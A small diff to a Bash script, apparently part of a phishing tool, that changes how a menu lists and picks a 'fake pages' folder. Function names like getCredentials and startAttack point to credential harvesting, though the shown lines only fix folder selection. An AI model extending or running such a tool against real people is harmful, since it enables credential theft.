@@ -27,7 +27,7 @@ function getCredentials(){
 
 function selectFakePagesFolder(){
     echo "Listando pastas no diretório atual:"
-    select folder in $(ls -d */ | cat -n); do
+    select folder in */; do
         if [ -n "$folder" ]; then
             break
         else
@@ -35,7 +35,7 @@ function selectFakePagesFolder(){
         fi
     done
 
-    selected_folder=$(echo $folder | awk '{print $2}')
+    selected_folder=$(echo $folder | sed 's/\///')  # Remove a barra no final do nome da pasta
 }
 
 function startAttack(){
